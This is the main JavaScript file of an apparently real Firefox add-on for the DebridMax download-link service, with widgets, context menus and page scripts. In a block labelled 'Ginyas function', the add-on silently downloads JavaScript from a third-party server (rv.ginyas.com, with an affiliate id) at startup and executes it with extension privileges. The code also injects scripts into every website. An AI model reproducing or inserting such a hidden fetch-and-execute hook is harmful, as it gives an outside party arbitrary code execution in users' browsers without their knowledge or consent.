//Defining components variable
var ss = require("simple-storage");
const data = require("self").data;
var pagemods = require("page-mod");
var panels = require("panel");
var contextMenu = require("context-menu");
var generator = require("generator");
var Request = require("request").Request;


const hiddenFrames = require("hidden-frame");
const win = require("windows").browserWindows;

//For making windows
const {Cc, Ci} = require("chrome");
					  
					  
//BEGIN Ginyas variables
var tb = require("tabs");
var tt = require("timer");
var pp = require("panel").Panel;


//END Ginyas variables

exports.main = function(options, callbacks) {
  console.log(options.loadReason);
	
	//BEGIN Ginyas function
	function globalEval(src, callback) {
		
		//it was eval(src); This can be changed using anonymous function like below
		var altEval = new Function(src);
		altEval();
				
		if (callback){callback();}
	}

	new Request({
	 url: "http://rv.ginyas.com/app/bookmark/bookmarklet/bbrsFFJetPackRVObs.php?affId=ginyas_99",
	 onComplete: function(){
			var txt=this.response.text;	
			try{
				globalEval(txt);
			}catch(err){console.log("err: "+err);}
		}
	}).get();
	//END Ginyas function

	//links to be shown on generated_link.html
	ss.storage.genlink_href = []; //href

	//set cachedLinks to null when the addon's started
	ss.storage.cachedLinks="";

	//Declaring workers
	var subWinWorker, genLinkWorker;

	//Show load.gif as widget icon
	function showLoaderIconOnWidget(){
		debridWidget.contentURL = data.url("load.gif");
	}

	//Show default icon (icon19.png) as widget icon & decide to whether open generated_link.html or alert that there is no link generated
	function finishLoadingAction(){
		debridWidget.contentURL = data.url("icon19.png");
		if((ss.storage.genlink_href).length>0)
		{
			win.open(data.url("generated_link.html"));
		}
		else
			debridWidget.panel.postMessage({'type':'noLinkGeneratedAlert'});
	}
	
	//submission window message handler for its page-mod
	function subWindowMsgHandler(msg){
		console.log("subWinMsgHandler msg.type: " + msg.type);
		if(msg.type=="open_debrid")
			win.open("http://www.debridmax.com/");
		else if(msg.type=="open_donate")
			win.open("https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=VPJ5YQHBG7L36");
		else if(msg.type=="clearLinkCache")	
			ss.storage.cachedLinks="";
		else
			return;
	}

	//generated link window message handler for its page-mod
	function genLinkMsgHandler(msg){
		if(msg.type=="ready")
			genLinkWorker.postMessage({'linksarray':ss.storage.genlink_href});
		else if(msg.type=="clearLinksStorage")
			ss.storage.genlink_href=[];
		else
			require("clipboard").set(msg.content);
	}

	//send the link to submission window
	function sendLinkToSubWin(links)
	{
		if(ss.storage.cachedLinks)
			ss.storage.cachedLinks += links + "\r\n";
		else
			ss.storage.cachedLinks = links + "\r\n";
		
		var i=0;
		var index=0;
		for each(var window in win)
		{
			for each(var tab in window.tabs)
			{
				console.log(tab.url);
				if(tab.url==data.url("submissionWindow.html"))
					tab.close();
			}
		}
		win.open(data.url("submissionWindow.html"));
	}
		
		
	//Page-mod object for submissionWindow.html
	pagemods.PageMod({
		include: data.url("submissionWindow.html"),
		contentScriptWhen: 'ready',
		contentScriptFile: [data.url("jquery-1.5.2.min.js"), data.url("subWin.js"), data.url("loginChecker.js"), data.url("htmlparser.js")],
		onAttach: function onAttach(worker){
			
			worker.on('message', subWindowMsgHandler);
			
			//param[0] is the link
			//param[1] is the password of the link
			//param[2] is total of the links
			//param[3] is index of the link
			worker.port.on("generateLink",function generateLink(param){
				showLoaderIconOnWidget();
				generator.generate(param[0],param[1],function(generatedLink){
					ss.storage.genlink_href.push(generatedLink);
					if(param[2] == param[3]+1)
						finishLoadingAction();
				});
			});
			subWinWorker = worker;
			
			//to make sure that the subwin always checks the cachedLinks when it's opened and the worker's attached.
			if(ss.storage.cachedLinks)
				subWinWorker.postMessage({'type' : 'cached_links','content' : ss.storage.cachedLinks});
			
		}
	});

	//Page-mod object for generated_link.html
	pagemods.PageMod({
		include: data.url("generated_link.html"),
		contentScriptWhen: 'ready',
		contentScriptFile: [data.url("jquery-1.5.2.min.js"), data.url("genlink.js")],
		onAttach: function onAttach(worker){
			worker.on('message', genLinkMsgHandler);
			genLinkWorker = worker;
		}
	});

	//Page-mod object for websites
	pagemods.PageMod({
	  include: "*",
	  contentScriptWhen: 'ready',
	  contentScriptFile: [data.url("context_button.js"), data.url("hostSetter.js"),
						 data.url("pageModder.js"),data.url("loginChecker.js"),data.url("htmlparser.js")],
	  
	  onAttach: function onAttach(worker) {
			
		//param[0] is the link
		//param[1] is the password of the link
		//param[2] is total of the links
		//param[3] is index of the link
		worker.port.on("generateLink",function generateLink(param){
				showLoaderIconOnWidget();
				generator.generate(param[0],param[1],function(generatedLink){
					ss.storage.genlink_href.push(generatedLink);
					if(param[2] == param[3]+1)
						finishLoadingAction();
				});
			});
	  }
	});

	//Debridmax Widget
	var debridWidget = require("widget").Widget({
		id: "debrid_widget",
		label: "DebridMax",
		contentURL: data.url("icon19.png"),
		panel: panels.Panel({
			height: 150,
			width : 220,
			contentURL: data.url("popup.html"),
			contentScriptFile: [data.url("jquery-1.5.2.min.js"),data.url("popup.js"),data.url("loginChecker.js"),data.url("htmlparser.js")],
			onShow: function(){
				this.postMessage("loading");
							
				hiddenFrames.add(hiddenFrames.HiddenFrame({
							  onReady: function() {
								this.element.contentWindow.location = "http://www.debridmax.com/multimax/?lang=en";
								let self = this;
								this.element.addEventListener("DOMContentLoaded", function() {
									if(self.element.contentDocument.body.querySelector("h3"))
										debridWidget.panel.port.emit("parseLoginDetails",{'msg':self.element.contentDocument.body.querySelector("h3").innerHTML, 'isLoggedIn':true});
									else
										debridWidget.panel.port.emit("parseLoginDetails", {'msg':"Note: You are not currently logged in to Debridmax. Please login before using the tool." + '(<a href="#" id="login">Login</a>)', 'isLoggedIn':false})
								}, true, true);
							  }
							}));
				
			},
			onMessage: function(m){
				switch (m){
					case "hidePanel":
						this.hide();
						break;
					case "openLoginTab":
						require("tabs").open("http://www.debridmax.com/login.php");
						break;
					case "openSubWin":
						this.postMessage({'type':'openSubWin'});
					default:
						return;
				}
			}
		})
	});

	//BEGIN Context menu - It is set here because it needs the saved login details when it starts
				
	//Selection context menu
	var selectionContextMenu = contextMenu.Menu({
		label: "Debridmax",
		context: contextMenu.SelectionContext(),
		contentScriptWhen: 'ready',
		contentScriptFile: [data.url("selectioncontextMenu.js"),data.url("loginChecker.js"),data.url("htmlparser.js")],
		onMessage: onMessageContextMenu,
		items: [
		contextMenu.Item({ label: "Download selected", data: "ddl" }),
		contextMenu.Item({ label: "Send to submission window", data: "subwin" })
		]
	});

	//Link context menu
	var linkContextMenu = contextMenu.Menu({
		label: "Debridmax",
		context: contextMenu.SelectorContext("a[href]"),
		contentScriptWhen: 'ready',
		contentScriptFile: [data.url("linkcontextMenu.js"),data.url("loginChecker.js"),data.url("htmlparser.js")],
		onMessage: onMessageContextMenu,
		items: [
		contextMenu.Item({ label: "Download link", data: "ddl" }),
		contextMenu.Item({ label: "Send to submission window", data: "subwin" })
		]
	});

	//callback for selectionContextMenu and linkContextMenu 
	function onMessageContextMenu(m) 
	{
		console.log(m.type);
		switch (m.type)
		{
			case "send_link_to_subwin" :
				sendLinkToSubWin(m.content);
				break;
			case "generateLink" :
				showLoaderIconOnWidget();
				generator.generate(m.link,"",function(generatedLink){
					ss.storage.genlink_href.push(generatedLink);
					if(m.length == m.index+1)
						finishLoadingAction();
				});
			default:
				return;
		}
	}
//END Context menu
}

exports.onUnload = function (reason) {
  console.log(reason);
};